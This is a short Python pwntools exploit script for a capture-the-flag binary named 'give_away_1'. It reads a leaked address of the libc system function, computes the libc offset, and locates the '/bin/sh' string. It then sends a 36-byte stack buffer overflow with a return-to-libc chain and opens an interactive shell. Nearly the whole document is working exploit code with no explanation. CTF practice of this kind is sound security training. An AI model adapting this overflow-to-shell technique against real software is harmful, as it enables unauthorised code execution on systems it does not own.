#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context(log_level="debug")
#p = process('./0_give_away')
#p = remote('sharkyctf.xyz', 20334)
p = process(['./give_away_1'],env={"LD_PRELOAD":"./libc-2.27.so"})

elf = ELF('./give_away_1')
libc=ELF('./libc-2.27.so')

#gdb.attach(p, 'b main')
p.recvuntil('Give away: ')

#binsh_addr=libc.search("/bin/sh").next()
#binsh_addr=0x0017E0CF
system_addr=int(p.recvuntil('\n'), 16)
system_bin=0x00001FDC
#system_libc=0x0003D200
system_libc=libc.symbols['system']

printf_got=elf.got['printf']
printf_plt=elf.plt["printf"]
printf_libc = libc.symbols['printf']
system_got=elf.got['system']
#system_plt=elf.plt["system"]
system_libc = libc.symbols['system']
binsh_libc=libc.search("/bin/sh").next()

print "printf_got : " + hex(printf_got)
print "printf_plt : " + hex(printf_plt)
print "printf_libc : " + hex(printf_libc)
print "system_got : " + hex(system_got)
#print "system_plt : " + hex(system_plt)
print "system_libc : " + hex(system_libc)
print "system_addr : " + hex(system_addr)

offset = system_addr - system_libc
binsh_addr= binsh_libc + offset
print "binsh_addr : " + hex(binsh_addr)
payload = 'A'*36
payload += p32(system_addr) + p32(system_addr) + p32(binsh_addr)
#pause()

p.sendline(payload)
p.interactive()

